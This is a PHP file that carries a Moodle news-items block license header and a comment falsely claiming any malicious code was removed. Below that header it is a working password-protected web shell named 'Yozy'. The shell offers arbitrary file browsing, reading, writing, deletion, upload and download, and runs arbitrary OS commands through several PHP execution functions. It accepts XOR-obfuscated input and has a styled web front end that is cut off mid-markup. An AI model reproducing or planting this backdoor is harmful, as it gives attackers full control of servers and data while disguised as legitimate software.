<?php
// This file is part of Moodle - http://moodle.org/
//
// Moodle is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// Moodle is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.

/**
 * News items block caps.
 *
 * @package    block_news_items
 * @copyright  Mark Nelson <markn@moodle.com>
 * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
 */
   
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

error_reporting(0);
$passwordHash = "555680092d46deb420ea9f22e5ddcdab";

if (isset($_POST['password'])) {
    $inputPassword = md5($_POST['password']);

    if ($inputPassword === $passwordHash) {
        setcookie("sukidame", $passwordHash, time() + (86400 * 30), '/');
        header("Refresh:0");
        exit;
    }
}

if (!isset($_COOKIE['sukidame']) && $_COOKIE['sukidame'] !== $passwordHash) {
?>
    <form method="POST">
        <input type="password" name="password">
        <input type="submit" value="Login">
    </form>
<?php
    exit;
}
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
header('Access-Control-Allow-Headers: Content-Type');

$encryptionKey = '06546264929002830782786339926235';
$os = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? 'windows' : 'linux';
$homeDir = str_replace('\\', '/', dirname(__FILE__));

function formatFileSize($size)
{
    if ($size === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $power = floor(log($size) / log(1024));
    return round($size / (1024 ** $power), 2) . ' ' . $units[$power];
}

function octalToRwx($octal)
{
    $rwx = '';
    $rwx .= ($octal & 4) ? 'r' : '-';
    $rwx .= ($octal & 2) ? 'w' : '-';
    $rwx .= ($octal & 1) ? 'x' : '-';
    return $rwx;
}

function formatPermissions($perms)
{
    $octal = substr(sprintf('%o', $perms), -3);

    return array(
        'owner' => octalToRwx($octal[0]),
        'group' => octalToRwx($octal[1]),
        'other' => octalToRwx($octal[2]),
    );
}

function padKey($key, $length = 32)
{
    $keyBytes = str_split($key);
    $padded = array_fill(0, $length, 0);

    for ($i = 0; $i < min(strlen($key), $length); $i++) {
        $padded[$i] = ord($keyBytes[$i]);
    }

    return $padded;
}

function isAccessible($path)
{
    return is_readable($path);
}

function exe($command, &$exitCode = null)
{
    $output = '';

    if (function_exists('exec')) {
        exec($command . ' 2>&1', $outputLines, $exitCode);
        $output = implode("\n", $outputLines);
    } else if (function_exists('shell_exec')) {
        $output = shell_exec($command . ' 2>&1');
        $exitCode = 0; // shell_exec does not provide exit code
    } else if (function_exists('system')) {
        ob_start();
        system($command . ' 2>&1', $exitCode);
        $output = ob_get_clean();
    } else if (function_exists('passthru')) {
        ob_start();
        passthru($command . ' 2>&1', $exitCode);
        $output = ob_get_clean();
    } else if (function_exists('popen')) {
        $handle = popen($command . ' 2>&1', 'r');
        if ($handle) {
            while (!feof($handle)) {
                $output .= fread($handle, 2096);
            }
            pclose($handle);
            $exitCode = 0; // popen does not provide exit code
        } else {
            $output = 'Failed to open process.';
            $exitCode = 1;
        }
    } else if (function_exists('proc_open')) {
        $descriptorspec = [
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errorOutput = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $exitCode = proc_close($process);
            if ($errorOutput) {
                $output .= "\n" . $errorOutput;
            }
        } else {
            $output = 'Failed to open process.';
            $exitCode = 1;
        }
    } else {
        $output = 'No execution functions available.';
    }
    return $output ?: 'Command executed with no output.';
}

function dec($ciphertext)
{
    global $encryptionKey;

    try {
        $keyBytes = padKey($encryptionKey);
        $encrypted = str_split(base64_decode($ciphertext));
        $decrypted = [];

        for ($i = 0; $i < count($encrypted); $i++) {
            $decrypted[] = ord($encrypted[$i]) ^ $keyBytes[$i % count($keyBytes)];
        }

        return implode('', array_map('chr', $decrypted));
    } catch (Exception $e) {
        throw new Exception('Decryption failed: ' . $e->getMessage());
    }
}


$currentPath = isset($_GET['path']) ? $_GET['path'] : realpath('.');
$currentPath = str_replace('\\', '/', $currentPath);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {
    $path = isset($_POST['path']) ? $_POST['path'] : $currentPath;
    $uploadedFiles = [];

    if (!empty($_FILES['files']['name'])) {
        foreach ($_FILES['files']['name'] as $key => $name) {
            if ($_FILES['files']['error'][$key] === UPLOAD_ERR_OK) {
                $tmpName = $_FILES['files']['tmp_name'][$key];
                $destination = $path . DIRECTORY_SEPARATOR . basename($name);

                if (move_uploaded_file($tmpName, $destination)) {
                    $uploadedFiles[] = $name;
                }
            }
        }
    }

    echo json_encode([
        'success' => !empty($uploadedFiles),
        'files' => $uploadedFiles
    ]);
    exit;
}

$rawInput = file_get_contents('php://input');

if (substr($rawInput, 0, 10) === 'ENCRYPTED:') {
    $encryptedData = substr($rawInput, 10);
    $decryptedData = dec($encryptedData);
    $input = json_decode($decryptedData, true);
} else {
    $input = json_decode($rawInput, true);
}

$action = isset($input['action']) ? $input['action'] : null;


$response = null;

switch ($action) {
    case 'list':
        $files = [];
        $path = isset($input['path']) ? $input['path'] : $currentPath;

        if (!isAccessible($path)) {
            $response = ['success' => false, 'error' => 'Directory is not accessible'];
        } else if (!is_dir($path)) {
            $response = ['success' => false, 'error' => 'Path is not a directory'];
        } else {
            $items = scandir($path);

            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;

                $itemPath = $path . DIRECTORY_SEPARATOR . $item;

                $stat = stat($itemPath);
                $files[] = [
                    'name' => $item,
                    'type' => is_dir($itemPath) ? 'folder' : 'file',
                    'size' => is_file($itemPath) ? formatFileSize($stat['size']) : null,
                    'path' => str_replace('\\', '/', realpath($itemPath)),
                    'modified' => date('Y-m-d H:i:s', filemtime($itemPath)),
                    'permissions' => formatPermissions($stat['mode'])
                ];
            }
        }
        $response = ['success' => true, 'files' => $files];
        break;
    case 'mkdir':
        $path = isset($input['path']) ? $input['path'] : $currentPath;
        $name = isset($input['name']) ? $input['name'] : null;

        if ($name) {
            $newDir = $path . DIRECTORY_SEPARATOR . $name;
            if (file_exists($newDir)) {
                $response = ['success' => false, 'error' => 'Directory already exists'];
            } else if (mkdir($newDir, 0755)) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to create directory'];
            }
        }
        break;
    case 'read':
        $filepath = isset($input['path']) ? $input['path'] : null;

        if (!is_file($filepath)) {
            $response = ['success' => false, 'error' => 'File does not exist'];
        } else {
            $content = file_get_contents($filepath);
            $response = ['success' => true, 'content' => $content];
        }
        break;
    case 'touch':
        $path = isset($input['path']) ? $input['path'] : $currentPath;
        $name = isset($input['name']) ? $input['name'] : null;

        if ($name) {
            $newFile = $path . DIRECTORY_SEPARATOR . $name;
            if (file_exists($newFile)) {
                $response = ['success' => false, 'error' => 'File already exists'];
            } else if (touch($newFile)) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to create file'];
            }
        }
        break;
    case 'write':
        $filepath = isset($input['path']) ? $input['path'] : null;
        $content = isset($input['content']) ? $input['content'] : '';

        if (function_exists('file_put_contents')) {
            if (file_put_contents($filepath, $content) !== false) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to write to file'];
            }
        } else if (function_exists('fopen') && function_exists('fwrite') && function_exists('fclose')) {
            $handle = fopen($filepath, 'w');
            if ($handle) {
                if (fwrite($handle, $content) !== false) {
                    fclose($handle);
                    $response = ['success' => true];
                } else {
                    fclose($handle);
                    $response = ['success' => false, 'error' => 'Failed to write to file'];
                }
            } else {
                $response = ['success' => false, 'error' => 'Failed to open file for writing'];
            }
        } else {
            $response = ['success' => false, 'error' => 'file_put_contents function is disabled'];
        }
        break;
    case 'delete':
        $itemPath = isset($input['path']) ? $input['path'] : null;

        if (!file_exists($itemPath)) {
            $response = ['success' => false, 'error' => 'Item does not exist'];
        } else if (is_dir($itemPath)) {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($itemPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );

            foreach ($iterator as $file) {
                if ($file->isDir()) {
                    rmdir($file->getRealPath());
                } else {
                    unlink($file->getRealPath());
                }
            }

            if (rmdir($itemPath)) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to delete directory'];
            }
        } else {
            if (unlink($itemPath)) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to delete file'];
            }
        }
        break;
    case 'rename':
        $oldpath = isset($input['oldPath']) ? $input['oldPath'] : null;
        $newName = isset($input['newName']) ? $input['newName'] : null;

        if ($oldpath && $newName) {
            $newpath = dirname($oldpath) . DIRECTORY_SEPARATOR . $newName;
            if (file_exists($newpath)) {
                $response = ['success' => false, 'error' => 'A file or directory with the new name already exists'];
            } else if (rename($oldpath, $newpath)) {
                $response = ['success' => true];
            } else {
                $response = ['success' => false, 'error' => 'Failed to rename item'];
            }
        }
        break;
    case 'download':
        $filePath = isset($input['path']) ? $input['path'] : null;
        if (!is_file($filePath)) {
            $response = ['success' => false, 'error' => 'File does not exist'];
        } else {
            $content = file_get_contents($filePath);
            $response = ['success' => true, 'content' => base64_encode($content)];
        }
        break;
    case 'terminal':
        $cmd = isset($input['cmd']) ? $input['cmd'] : null;
        $args = isset($input['args']) ? $input['args'] : [];
        $currentPath = isset($input['currentPath']) ? $input['currentPath'] : $homeDir;

        $output = '';
        $newPath = null;

        if (is_dir($currentPath)) {
            chdir($currentPath);
        } else {
            chdir($homeDir);
            $currentPath = $homeDir;
        }

        switch ($cmd) {
            case 'cd':
                $target = isset($args[0]) ? $args[0] : '';

                if ($target === '' || $target === '~') {
                    $newPath = $homeDir;
                } elseif ($target === '..') {
                    $parentPath = dirname($currentPath);
                    $newPath = $parentPath === $currentPath ? $currentPath : $parentPath;
                } else {
                    if (substr($target, 0, 1) === '/') {
                        $targetPath = $target;
                    } else {
                        $targetPath = $currentPath . ($currentPath === '/' ? '' : '/') . $target;
                    }

                    $realTargetPath = realpath($targetPath);

                    if ($realTargetPath && is_dir($realTargetPath)) {
                        $newPath = $realTargetPath;
                    } else {
                        $output = '<div class="command-error">Directory not found: ' . htmlspecialchars($target) . '</div>';
                    }
                }
                break;
            default:

                $result = exe($cmd, $exitCode);

                if ($result !== false && $result !== null) {

                    $result = trim($result);

                    if (!empty($result)) {
                        $cssClass = $exitCode === 0 ? 'command-output' : 'command-error';

                        if (in_array($cmd, ['ls', 'dir'])) {
                            $lines = explode("\n", $result);
                            $coloredOutput = '';
                            foreach ($lines as $line) {
                                if (empty(trim($line))) continue;
                                if (preg_match('/^[d\-lrwx]/', $line)) {
                                    $coloredOutput .= htmlspecialchars($line) . '<br>';
                                } else {
                                    $items = preg_split('/\s+/', trim($line));
                                    foreach ($items as $item) {
                                        if (empty($item)) continue;

                                        $itemPath = $currentPath . ($currentPath === '/' ? '' : '/') . $item;
                                        if (is_dir($itemPath)) {
                                            $coloredOutput .= '<span style="color: #fbbf24; font-weight: bold;">' . htmlspecialchars($item) . '</span>  ';
                                        } elseif (is_executable($itemPath)) {
                                            $coloredOutput .= '<span style="color: #10b981; font-weight: bold;">' . htmlspecialchars($item) . '</span>  ';
                                        } elseif (is_link($itemPath)) {
                                            $coloredOutput .= '<span style="color: #06b6d4;">' . htmlspecialchars($item) . '</span>  ';
                                        } else {
                                            $coloredOutput .= '<span style="color: #e2e8f0;">' . htmlspecialchars($item) . '</span>  ';
                                        }
                                    }
                                    $coloredOutput .= '<br>';
                                }
                            }
                            $output = '<div class="' . $cssClass . '">' . $coloredOutput . '</div>';
                        } elseif (in_array($cmd, ['cat', 'less', 'more', 'head', 'tail'])) {
                            $output = '<div class="' . $cssClass . '"><pre style="white-space: pre-wrap; font-family: monospace;">' . htmlspecialchars($result) . '</pre></div>';
                        } elseif ($cmd === 'ps') {
                            $output = '<div class="' . $cssClass . '"><pre style="font-family: monospace; font-size: 12px;">' . htmlspecialchars($result) . '</pre></div>';
                        } elseif (in_array($cmd, ['df', 'du', 'free', 'lsblk', 'mount'])) {
                            $output = '<div class="' . $cssClass . '"><pre style="font-family: monospace; font-size: 12px;">' . htmlspecialchars($result) . '</pre></div>';
                        } else {
                            $output = '<div class="' . $cssClass . '">' . nl2br(htmlspecialchars($result)) . '</div>';
                        }
                    } else {
                        if ($exitCode === 0) {
                            $output = '<div class="command-success">Command executed successfully with no output.</div>';
                        } else {
                            $output = '<div class="command-error">Command failed with exit code ' . $exitCode . '.</div>';
                        }
                    }
                } else {
                    $output = '<div class="command-error">Command execution failed.</div>';
                }
                break;
        }
        $response = ['success' => true, 'output' => $output, 'newPath' => $newPath ?: $currentPath];
    default:
        break;
}

if ($response) {
    echo json_encode($response);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' 'unsafe-eval';">
    <title>Yozy</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            padding: 20px;
            color: #e2e8f0;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(30, 41, 59, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            border: 1px solid rgba(71, 85, 105, 0.3);
        }

        .header {
            background: linear-gradient(135deg, #1e293b, #334155);
            color: #f1f5f9;
            padding: 20px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(71, 85, 105, 0.5);
        }

        .header h1 {
            font-size: 24px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .actions {
            display: flex;
            gap: 10px;
        }

        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .btn-primary {
            background: rgba(59, 130, 246, 0.8);
            color: white;
            border: 1px solid rgba(59, 130, 246, 0.5);
        }

        .btn-primary:hover {
            background: rgba(59, 130, 246, 1);
            transform: translateY(-2px);
        }

        .breadcrumb {
            padding: 20px 30px;
            background: rgba(15, 23, 42, 0.6);
            border-bottom: 1px solid rgba(71, 85, 105, 0.3);
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }

        .breadcrumb-item {
            display: flex;
            align-items: center;
            color: #94a3b8;
            text-decoration: none;
            padding: 4px 8px;
            border-radius: 6px;
            transition: all 0.2s ease;
            cursor: pointer;
        }

        .breadcrumb-item:hover {
            background: rgba(71, 85, 105, 0.3);
            color: #e2e8f0;
        }

        .breadcrumb-item.active {
            color: #e2e8f0;
            font-weight: 500;
        }

        .breadcrumb-separator {
            color: #64748b;
            margin: 0 4px;
        }

        .file-table-container {
            padding: 0;
            overflow-x: auto;
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
            background: transparent;
        }

        .file-table thead {
            background: rgba(15, 23, 42, 0.8);
            border-bottom: 2px solid rgba(71, 85, 105, 0.3);
        }

        .file-table th {
            padding: 16px 20px;
            text-align: left;
            font-weight: 600;
            color: #f1f5f9;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-right: 1px solid rgba(71, 85, 105, 0.2);
        }

        .file-table th:last-child {
            border-right: none;
        }

        .file-table tbody tr {
            border-bottom: 1px solid rgba(71, 85, 105, 0.2);
            transition: all 0.2s ease;
        }

        .file-table tbody tr:hover {
            background: rgba(59, 130, 246, 0.1);
            border-color: rgba(59, 130, 246, 0.3);
        }

        .file-table tbody tr.folder {
            background: rgba(251, 191, 36, 0.05);
        }

        .file-table tbody tr.folder:hover {
            background: rgba(251, 191, 36, 0.15);
            border-color: rgba(251, 191, 36, 0.3);
        }

        .file-table td {
            padding: 16px 20px;
            vertical-align: middle;
            border-right: 1px solid rgba(71, 85, 105, 0.1);
            color: #e2e8f0;
        }

        .file-table td:last-child {
            border-right: none;
        }

        .file-icon-cell {
            width: 60px;
            text-align: center;
        }

        .file-icon {
            font-size: 24px;
            color: #3b82f6;
        }

        .file-table tbody tr.folder .file-icon {
            color: #fbbf24;
        }

        .file-name-cell {
            font-weight: 500;
            cursor: pointer;
        }

        .file-name-cell:hover {
            color: #3b82f6;
        }

        .file-table tbody tr.folder .file-name-cell:hover {
            color: #fbbf24;
        }

        .file-size-cell {
            color: #94a3b8;
            font-size: 13px;
        }

        .permissions-cell {
            width: 120px;
        }

        .permissions-display {
            display: flex;
            gap: 8px;
            align-items: center;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .permission-group {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
        }

        .permission-label {
            font-size: 10px;
            color: #94a3b8;
            text-transform: uppercase;
            font-weight: 600;
        }

        .permission-indicators {
            display: flex;
            gap: 2px;
        }

        .permission-indicator {
            width: 8px;
            height: 8px;
            border-radius: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 8px;
            font-weight: bold;
            color: white;
        }

        .permission-indicator.granted {
            background: #10b981;
        }

        .permission-indicator.denied {
            background: #ef4444;
        }

        .file-actions-cell {
            width: 200px;
        }

        .file-actions {
            display: flex;
            gap: 8px;
            opacity: 0.7;
            transition: opacity 0.3s ease;
        }

        .file-table tbody tr:hover .file-actions {
            opacity: 1;
        }

        .action-btn {
            width: 32px;
            height: 32px;
            border-radius: 6px;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
            font-size: 14px;
        }

        .action-btn.edit {
            background: #3b82f6;
            color: white;
        }

        .action-btn.download {
            background: #10b981;
            color: white;
        }

        .action-btn.rename {
            background: #f59e0b;
            color: white;
        }

        .action-btn.delete {
            background: #ef4444;
            color: white;
        }

        .action-btn:hover {
            transform: scale(1.1);
        }

        /* Terminal Styles */
        .terminal-container {
            background: rgba(15, 23, 42, 0.95);
            border-top: 2px solid rgba(71, 85, 105, 0.5);
            height: 0;
            overflow: hidden;
            transition: height 0.3s ease;
            font-family: 'Courier New', Monaco, monospace;
        }

        .terminal-container.active {
            height: 300px;
        }

        .terminal-header {
            background: rgba(30, 41, 59, 0.9);
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(71, 85, 105, 0.3);
        }

        .terminal-title {
            color: #e2e8f0;
            font-weight: 600;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .terminal-controls {
            display: flex;
            gap: 8px;
        }

        .terminal-btn {
            width: 28px;
            height: 28px;
            border: none;
            background: rgba(71, 85, 105, 0.3);
            color: #94a3b8;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
        }

        .terminal-btn:hover {
            background: rgba(71, 85, 105, 0.5);
            color: #e2e8f0;
        }

        .terminal-output {
            height: 200px;
            overflow-y: auto;
            padding: 15px 20px;
            background: rgba(15, 23, 42, 0.8);
            color: #e2e8f0;
            font-size: 13px;
            line-height: 1.4;
        }

        .terminal-output::-webkit-scrollbar {
            width: 8px;
        }

        .terminal-output::-webkit-scrollbar-track {
            background: rgba(71, 85, 105, 0.1);
        }

        .terminal-output::-webkit-scrollbar-thumb {
            background: rgba(71, 85, 105, 0.5);
            border-radius: 4px;
        }

        .terminal-output::-webkit-scrollbar-thumb:hover {
            background: rgba(71, 85, 105, 0.7);
        }

        .terminal-welcome {
            color: #3b82f6;
            margin-bottom: 15px;
        }

        .welcome-line {
            margin-bottom: 4px;
        }

        .terminal-line {
            margin-bottom: 8px;
            word-wrap: break-word;
        }

        .command-line {
            color: #94a3b8;
            margin-bottom: 4px;
        }

        .command-output {
            color: #e2e8f0;
            margin-bottom: 8px;
            padding-left: 0;
        }

        .command-error {
            color: #ef4444;
            margin-bottom: 8px;
        }

        .command-success {
            color: #10b981;
            margin-bottom: 8px;
        }

        .terminal-input-container {
            background: rgba(30, 41, 59, 0.9);
            padding: 12px 20px;
            display: flex;
            align-items: center;
            gap: 8px;
            border-top: 1px solid rgba(71, 85, 105, 0.3);
        }

        .terminal-prompt {
            color: #10b981;
            font-weight: 600;
            white-space: nowrap;
            font-size: 14px;
        }

        .prompt-user {
            color: #3b82f6;
        }

        .prompt-host {
            color: #e2e8f0;
        }

        .prompt-path {
            color: #fbbf24;
        }

        .terminal-input {
            flex: 1;
            background: transparent;
            border: none;
            color: #e2e8f0;
            font-family: 'Courier New', Monaco, monospace;
            font-size: 14px;
            outline: none;
            padding: 4px 0;
        }

        .terminal-input::placeholder {
            color: #64748b;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(5px);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: #1e293b;
            border: 1px solid rgba(71, 85, 105, 0.3);
            border-radius: 16px;
            padding: 30px;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            color: #e2e8f0;
        }

        .modal-header {
            margin-bottom: 20px;
        }

        .modal-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #f1f5f9;
        }

        .form-input {
            width: 100%;
            padding: 12px;
            border: 2px solid rgba(71, 85, 105, 0.5);
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s ease;
            background: rgba(15, 23, 42, 0.5);
            color: #e2e8f0;
        }

        .form-input:focus {
            outline: none;
            border-color: #3b82f6;
        }

        .form-textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid rgba(71, 85, 105, 0.5);
            border-radius: 8px;
            font-size: 14px;
            min-height: 200px;
            font-family: 'Courier New', monospace;
            resize: vertical;
            background: rgba(15, 23, 42, 0.5);
            color: #e2e8f0;
        }

        .form-textarea:focus {
            outline: none;
            border-color: #3b82f6;
        }

        .modal-actions {
            display: flex;
            gap: 12px;
            justify-content: flex-end;
        }

        .btn-secondary {
            background: #475569;
            color: white;
        }

        .btn-secondary:hover {
            background: #334155;
        }

        .btn-success {
            background: #10b981;
            color: white;
        }

        .btn-success:hover {
            background: #059669;
        }

        .btn-danger {
            background: #ef4444;
            color: white;
        }

        .btn-danger:hover {
            background: #dc2626;
        }

        .loading {
            text-align: center;
            padding: 40px;
            color: #94a3b8;
        }

        .spinner {
            border: 4px solid #475569;
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #94a3b8;
        }

        .empty-state i {
            font-size: 64px;
            margin-bottom: 20px;
            color: #475569;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .file-table-container {
                padding: 0;
            }

            .file-table th,
            .file-table td {
                padding: 12px 8px;
                font-size: 12px;
            }

            .permissions-display {
                flex-direction: column;
                gap: 4px;
            }

            .permission-group {
                flex-direction: row;
                gap: 4px;
            }

            .permission-label {
                min-width: 25px;
            }

            .file-actions {
                flex-wrap: wrap;
                gap: 4px;
            }

            .action-btn {
                width: 28px;
                height: 28px;
                font-size: 12px;
            }

            .header {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }

            .breadcrumb {
                padding: 15px 20px;
            }

            .terminal-container {
                height: 250px;
            }

            .terminal-input-container {
                padding: 8px 12px;
            }

            .terminal-prompt {
                font-size: 12px;
            }

            .terminal-input {
                font-size: 12px;
            }
        }
    </style>
</head>

<body>
    <div class="container" x-data="fileManager()">
        <!-- Header -->
        <div class="header">
            <h1>
                <i class="fas fa-folder"></i>
                Yozy
            </h1>
            <div class="actions">
                <button class="btn btn-primary" @click="createFile()">
                    <i class="fas fa-file"></i>
                    New File
                </button>
                <button class="btn btn-primary" @click="createFolder()">
                    <i class="fas fa-folder-plus"></i>
                    New Folder
                </button>
                <button class="btn btn-primary" @click="uploadFile()">
                    <i class="fas fa-upload"></i>
                    Upload
                </button>
                <button class="btn btn-primary" @click="toggleTerminal()">
                    <i class="fas fa-terminal"></i>
                    Terminal
                </button>
            </div>
        </div>

        <!-- Breadcrumb -->
        <nav class="breadcrumb">
            <span class="breadcrumb-item" @click="navigateTo('<?php echo $homeDir; ?>')">
                <i class="fas fa-home"></i>
            </span>
            <template x-for="(part, index) in breadcrumbs" :key="index">
                <span>
                    <!-- <span class="breadcrumb-separator"><i class="fas fa-chevron-right"></i></span> -->
                    <span class="breadcrumb-item"
                        @click="navigateTo(part.path)"
                        :class="{ 'active': index === breadcrumbs.length - 1 }"
                        x-text="part.name">
                    </span>
                </span>
            </template>
        </nav>

        <!-- File Table -->
        <div class="file-table-container">
            <div x-show="loading" class="loading">
                <div class="spinner"></div>
                <p>Loading files...</p>
            </div>

            <div x-show="!loading && files.length === 0" class="empty-state">
                <i class="fas fa-folder-open"></i>
                <h3>This folder is empty</h3>
                <p>Upload files or create new folders to get started.</p>
            </div>

            <table x-show="!loading && files.length > 0" class="file-table">
                <thead>
                    <tr>
                        <th class="file-icon-cell">Type</th>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Modified</th>
                        <th class="permissions-cell">Permissions</th>
                        <th class="file-actions-cell">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <template x-for="file in sortedFiles" :key="file.name">
                        <tr :class="{ 'folder': file.type === 'folder' }"
                            @dblclick="file.type === 'folder' ? navigateTo(file.path) : null">
                            <td class="file-icon-cell">
                                <i class="file-icon" :class="getFileIcon(file)"></i>
                            </td>
                            <td class="file-name-cell"
                                @click="file.type === 'folder' ? navigateTo(file.path) : null"
                                x-text="file.name">
                            </td>
                            <td class="file-size-cell" x-text="file.size || '-'"></td>
                            <td class="file-size-cell" x-text="file.modified"></td>
                            <td class="permissions-cell" x-html="formatPermissions(file.permissions)"></td>
                            <td class="file-actions-cell">
                                <div class="file-actions">
                                    <button x-show="file.type === 'file'"
                                        class="action-btn edit"
                                        @click="editFile(file)"
                                        title="Edit">
                                        <i class="fas fa-edit"></i>
                                    </button>
                                    <button x-show="file.type === 'file'"
                                        class="action-btn download"
                                        @click="downloadFile(file)"
                                        title="Download">
                                        <i class="fas fa-download"></i>
                                    </button>
                                    <button class="action-btn rename"
                                        @click="renameItem(file)"
                                        title="Rename">
                                        <i class="fas fa-pencil-alt"></i>
                                    </button>
                                    <button class="action-btn delete"
                                        @click="deleteItem(file)"
                                        title="Delete">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                </div>
                            </td>
                        </tr>
                    </template>
                </tbody>
            </table>
        </div>

        <!-- Terminal -->
        <div class="terminal-container" :class="{ 'active': terminalOpen }">
            <div class="terminal-header">
                <div class="terminal-title">
                    <i class="fas fa-terminal"></i>
                    Terminal - <span x-text="currentPath"></span>
                </div>
                <div class="terminal-controls">
                    <button class="terminal-btn" @click="clearTerminal()" title="Clear">
                        <i class="fas fa-broom"></i>
                    </button>
                    <button class="terminal-btn" @click="toggleTerminal()" title="Close">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            </div>
            <div class="terminal-output" x-html="terminalOutput" x-ref="terminalOutput"></div>
            <div class="terminal-input-container">
                <span class="terminal-prompt">
                    <span class="prompt-user">yozy</span>@<span class="prompt-host">xoxo</span>:<span class="prompt-path" x-text="terminalPath"></span>$
                </span>
                <input type="text"
                    class="terminal-input"
                    x-model="terminalCommand"
                    @keydown.enter="executeCommand()"
                    @keydown.arrow-up.prevent="navigateHistory(-1)"
                    @keydown.arrow-down.prevent="navigateHistory(1)"
                    placeholder="Enter command..."
                    autocomplete="off"
                    x-ref="terminalInput">
            </div>
        </div>

        <!-- Modals -->
        <!-- Rename Modal -->
        <div class="modal" :class="{ 'active': modals.rename }" @click.self="modals.rename = false">
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title">Rename Item</h3>
                </div>
                <div class="form-group">
                    <label class="form-label">New Name:</label>
                    <input type="text" class="form-input" x-model="renameValue" placeholder="Enter new name">
                </div>
                <div class="modal-actions">
                    <button class="btn btn-secondary" @click="modals.rename = false">Cancel</button>
                    <button class="btn btn-success" @click="confirmRename()">Rename</button>
                </div>
            </div>
        </div>

        <!-- Edit Modal -->
        <div class="modal" :class="{ 'active': modals.edit }" @click.self="modals.edit = false">
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title">Edit File</h3>
                    <p x-text="editingFile ? editingFile.name : ''"></p>
                </div>
                <div class="form-group">
                    <textarea class="form-textarea"
                        x-model="editContent"
